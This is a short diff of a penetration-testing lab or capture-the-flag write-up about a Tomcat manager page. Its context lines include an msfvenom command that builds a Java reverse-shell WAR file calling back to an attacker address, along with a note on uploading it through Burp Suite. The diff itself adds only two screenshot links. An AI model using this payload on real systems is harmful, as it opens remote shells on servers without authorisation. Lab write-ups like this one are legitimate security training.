@@ -24,5 +24,7 @@ http://10.10.10.250/manager/html can be accessed using [exploit](https://www.acu
 Using command `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.98 LPORT=1234 -f war -o sh.war` to get war reverse shell.
 ![[Pasted image 20210928103728.png]]
 ## uploading war file `sh.war` using burp suite repeater
+![[Pasted image 20210928104229.png]]
+![[Pasted image 20210928104539.png]]
 
 
